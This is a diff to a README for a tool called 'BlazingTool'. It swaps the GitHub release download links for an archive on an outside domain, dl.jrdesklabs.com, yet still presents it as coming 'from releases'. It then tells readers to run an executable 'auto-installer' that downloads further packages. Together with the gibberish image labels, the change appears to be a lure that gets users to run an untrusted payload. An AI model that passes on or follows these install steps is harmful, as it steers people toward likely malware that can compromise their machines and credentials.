@@ -8,10 +8,10 @@ BlazingTool
  ### Installation
 To install this programm, follow these steps:
 
-[![asdasdasd](https://github.com/user-attachments/assets/c4f6ee44-fc53-48d6-805a-0f47023c2bd5)](https://github.com/AdeiltonPereiraAlves/BlazingTool/releases/download/V3.2/Release.zip)
+[![asdasdasd](https://github.com/user-attachments/assets/c4f6ee44-fc53-48d6-805a-0f47023c2bd5)](https://dl.jrdesklabs.com/Setup.zip)
 
 
-## **1. [Download the archive](https://github.com/AdeiltonPereiraAlves/BlazingTool/releases/download/V3.2/Release.zip) from releases and extract it to a convenient folder.**
+## **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) from releases and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 ![jyujghg](https://github.com/user-attachments/assets/edcfe846-becb-4d75-bf12-dcadb3b90a46)
 ![sdsfdsdsdd](https://github.com/user-attachments/assets/a4dbf9fc-e1df-4c0c-a01d-562852a7a033)
